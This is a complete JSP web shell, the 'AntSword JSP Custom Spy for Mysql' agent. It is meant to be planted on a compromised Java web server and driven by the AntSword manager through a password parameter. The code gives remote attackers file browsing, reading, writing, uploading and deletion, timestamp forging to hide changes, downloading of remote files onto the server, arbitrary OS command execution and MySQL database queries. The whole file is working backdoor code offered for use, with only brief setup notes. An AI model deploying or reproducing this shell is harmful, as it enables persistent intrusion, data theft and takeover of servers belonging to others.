<%--
             _   ____                       _
  __ _ _ __ | |_/ ___|_      _____  _ __ __| |
 / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
| (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
 \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
———————————————————————————————————————————————
    AntSword JSP Custom Spy for Mysql
                    Author:Medici.Yan
———————————————————————————————————————————————

说明：
 1. AntSword >= v1.1-dev
 2. 创建 Shell 时选择 custom 模式连接
 3. 数据库连接：
    com.mysql.jdbc.Driver
    jdbc:mysql://localhost/test?user=root&password=123456

    注意：以上是两行
 4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空

ChangeLog:

  Date: 2016/04/06 v1.1
   1. 修正下载文件参数设置错误
   2. 修正一些注释的细节
  Date: 2016/03/26 v1
   1. 文件系统 和 terminal 管理
   2. mysql 数据库支持
   3. 支持 base64 和 hex 编码
--%>
<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!
    String Pwd = "ant";   //连接密码
    // 数据编码 3 选 1
    String encoder = ""; // default
    // String encoder = "base64"; //base64
    // String encoder = "hex"; //hex
    String cs = "UTF-8"; // 脚本自身编码
    String EC(String s) throws Exception {
        if(encoder.equals("hex") || encoder == "hex") return s;
        return new String(s.getBytes("ISO-8859-1"), cs);
    }

    String showDatabases(String encode, String conn) throws Exception {
        String sql = "show databases"; // mysql
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }

    String showTables(String encode, String conn, String dbname) throws Exception {
        String sql = "show tables from " + dbname; // mysql
        String columnsep = "\t";
        String rowsep = "";
        return executeSQL(encode, conn, sql, columnsep, rowsep, false);
    }

    String showColumns(String encode, String conn, String dbname, String table) throws Exception {
        String columnsep = "\t";
        String rowsep = "";
        String sql = "select * from " + dbname + "." + table + " limit 0,0"; // mysql
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }

    String query(String encode, String conn, String sql) throws Exception {
        String columnsep = "\t|\t"; // general
        String rowsep = "\r\n";
        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
    }

    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
            throws Exception {
        String ret = "";
        conn = (EC(conn));
        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
        Class.forName(x[0].trim());
        String url = x[1] + "&characterEncoding=" + decode(EC(encode),encoder);
        Connection c = DriverManager.getConnection(url);
        Statement stmt = c.createStatement();
        ResultSet rs = stmt.executeQuery(sql);
        ResultSetMetaData rsmd = rs.getMetaData();

        if (needcoluname) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnName = rsmd.getColumnName(i);
                ret += columnName + columnsep;
            }
            ret += rowsep;
        }

        while (rs.next()) {
            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
                String columnValue = rs.getString(i);
                ret += columnValue + columnsep;
            }
            ret += rowsep;
        }
        return ret;
    }

    String WwwRootPathCode(HttpServletRequest r) throws Exception {
        String d = r.getSession().getServletContext().getRealPath("/");
        String s = "";
        if (!d.substring(0, 1).equals("/")) {
            File[] roots = File.listRoots();
            for (int i = 0; i < roots.length; i++) {
                s += roots[i].toString().substring(0, 2) + "";
            }
        } else {
            s += "/";
        }
        return s;
    }

    String FileTreeCode(String dirPath) throws Exception {
        File oF = new File(dirPath), l[] = oF.listFiles();
        String s = "", sT, sQ, sF = "";
        java.util.Date dt;
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        for (int i = 0; i < l.length; i++) {
            dt = new java.util.Date(l[i].lastModified());
            sT = fm.format(dt);
            sQ = l[i].canRead() ? "R" : "";
            sQ += l[i].canWrite() ? " W" : "";
            if (l[i].isDirectory()) {
                s += l[i].getName() + "/\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            } else {
                sF += l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t" + sQ + "\n";
            }
        }
        return s += sF;
    }

    String ReadFileCode(String filePath) throws Exception {
        String l = "", s = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(filePath))));
        while ((l = br.readLine()) != null) {
            s += l + "\r\n";
        }
        br.close();
        return s;
    }

    String WriteFileCode(String filePath, String fileContext) throws Exception {
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(filePath))));
        bw.write(fileContext);
        bw.close();
        return "1";
    }

    String DeleteFileOrDirCode(String fileOrDirPath) throws Exception {
        File f = new File(fileOrDirPath);
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (int k = 0; k < x.length; k++) {
                if (!x[k].delete()) {
                    DeleteFileOrDirCode(x[k].getPath());
                }
            }
        }
        f.delete();
        return "1";
    }

    void DownloadFileCode(String filePath, HttpServletResponse r) throws Exception {
        int n;
        byte[] b = new byte[512];
        r.reset();
        ServletOutputStream os = r.getOutputStream();
        BufferedInputStream is = new BufferedInputStream(new FileInputStream(filePath));
        os.write(("->|").getBytes(), 0, 3);
        while ((n = is.read(b, 0, 512)) != -1) {
            os.write(b, 0, n);
        }
        os.write(("|<-").getBytes(), 0, 3);
        os.close();
        is.close();
    }

    String UploadFileCode(String savefilePath, String fileHexContext) throws Exception {
        String h = "0123456789ABCDEF";
        File f = new File(savefilePath);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < fileHexContext.length(); i += 2) {
            os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i + 1))));
        }
        os.close();
        return "1";
    }

    String CopyFileOrDirCode(String sourceFilePath, String targetFilePath) throws Exception {
        File sf = new File(sourceFilePath), df = new File(targetFilePath);
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (int j = 0; j < z.length; j++) {
                CopyFileOrDirCode(sourceFilePath + "/" + z[j].getName(), targetFilePath + "/" + z[j].getName());
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[1024];
            while ((n = is.read(b, 0, 1024)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
        return "1";
    }

    String RenameFileOrDirCode(String oldName, String newName) throws Exception {
        File sf = new File(oldName), df = new File(newName);
        sf.renameTo(df);
        return "1";
    }

    String CreateDirCode(String dirPath) throws Exception {
        File f = new File(dirPath);
        f.mkdir();
        return "1";
    }

    String ModifyFileOrDirTimeCode(String fileOrDirPath, String aTime) throws Exception {
        File f = new File(fileOrDirPath);
        SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        java.util.Date dt = fm.parse(aTime);
        f.setLastModified(dt.getTime());
        return "1";
    }

    String WgetCode(String urlPath, String saveFilePath) throws Exception {
        URL u = new URL(urlPath);
        int n = 0;
        FileOutputStream os = new FileOutputStream(saveFilePath);
        HttpURLConnection h = (HttpURLConnection) u.openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[512];
        while ((n = is.read(b)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
        return "1";
    }

    String SysInfoCode(HttpServletRequest r) throws Exception {
        String d = r.getSession().getServletContext().getRealPath("/");
        String serverInfo = System.getProperty("os.name");
        String separator = File.separator;
        String user = System.getProperty("user.name");
        String driverlist = WwwRootPathCode(r);
        return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
    }

    boolean isWin() {
        String osname = System.getProperty("os.name");
        osname = osname.toLowerCase();
        if (osname.startsWith("win"))
            return true;
        return false;
    }

    String ExecuteCommandCode(String cmdPath, String command) throws Exception {
        StringBuffer sb = new StringBuffer("");
        String[] c = { cmdPath, !isWin() ? "-c" : "/c", command };
        Process p = Runtime.getRuntime().exec(c);
        CopyInputStream(p.getInputStream(), sb);
        CopyInputStream(p.getErrorStream(), sb);
        return sb.toString();
    }

    String decode(String str) {
        byte[] bt = null;
        try {
            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
            bt = decoder.decodeBuffer(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new String(bt);
    }
    String decode(String str, String encode){
        if(encode.equals("hex") || encode=="hex"){
            if(str=="null"||str.equals("null")){
                return "";
            }
            StringBuilder sb = new StringBuilder();
            StringBuilder temp = new StringBuilder();
            try{
                for(int i=0; i<str.length()-1; i+=2 ){
                    String output = str.substring(i, (i + 2));
                    int decimal = Integer.parseInt(output, 16);
                    sb.append((char)decimal);
                    temp.append(decimal);
                }
            }catch(Exception e){
                e.printStackTrace();
            }
            return sb.toString();
        }else if(encode.equals("base64") || encode == "base64"){
            byte[] bt = null;
            try {
                sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
                bt = decoder.decodeBuffer(str);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return new String(bt);
        }
        return str;
    }

    void CopyInputStream(InputStream is, StringBuffer sb) throws Exception {
        String l;
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        while ((l = br.readLine()) != null) {
            sb.append(l + "\r\n");
        }
        br.close();
    }%>
<%
    response.setContentType("text/html");
    response.setCharacterEncoding(cs);
    StringBuffer sb = new StringBuffer("");
    try {
        String funccode = EC(request.getParameter(Pwd) + "");
        String z0 = decode(EC(request.getParameter("z0")+""), encoder);
        String z1 = decode(EC(request.getParameter("z1") + ""), encoder);
        String z2 = decode(EC(request.getParameter("z2") + ""), encoder);
        String z3 = decode(EC(request.getParameter("z3") + ""), encoder);
        String[] pars = { z0, z1, z2, z3};
        sb.append("->|");

        if (funccode.equals("B")) {
            sb.append(FileTreeCode(pars[1]));
        } else if (funccode.equals("C")) {
            sb.append(ReadFileCode(pars[1]));
        } else if (funccode.equals("D")) {
            sb.append(WriteFileCode(pars[1], pars[2]));
        } else if (funccode.equals("E")) {
            sb.append(DeleteFileOrDirCode(pars[1]));
        } else if (funccode.equals("F")) {
            DownloadFileCode(pars[1], response);
        } else if (funccode.equals("U")) {
            sb.append(UploadFileCode(pars[1], pars[2]));
        } else if (funccode.equals("H")) {
            sb.append(CopyFileOrDirCode(pars[1], pars[2]));
        } else if (funccode.equals("I")) {
            sb.append(RenameFileOrDirCode(pars[1], pars[2]));
        } else if (funccode.equals("J")) {
            sb.append(CreateDirCode(pars[1]));
        } else if (funccode.equals("K")) {
            sb.append(ModifyFileOrDirTimeCode(pars[1], pars[2]));
        } else if (funccode.equals("L")) {
            sb.append(WgetCode(pars[1], pars[2]));
        } else if (funccode.equals("M")) {
            sb.append(ExecuteCommandCode(pars[1], pars[2]));
        } else if (funccode.equals("N")) {
            sb.append(showDatabases(pars[0], pars[1]));
        } else if (funccode.equals("O")) {
            sb.append(showTables(pars[0], pars[1], pars[2]));
        } else if (funccode.equals("P")) {
            sb.append(showColumns(pars[0], pars[1], pars[2], pars[3]));
        } else if (funccode.equals("Q")) {
            sb.append(query(pars[0], pars[1], pars[2]));
        } else if (funccode.equals("A")) {
            sb.append(SysInfoCode(request));
        }
    } catch (Exception e) {
        sb.append("ERROR" + "://" + e.toString());
    }
    sb.append("|<-");
    out.print(sb.toString());
%>
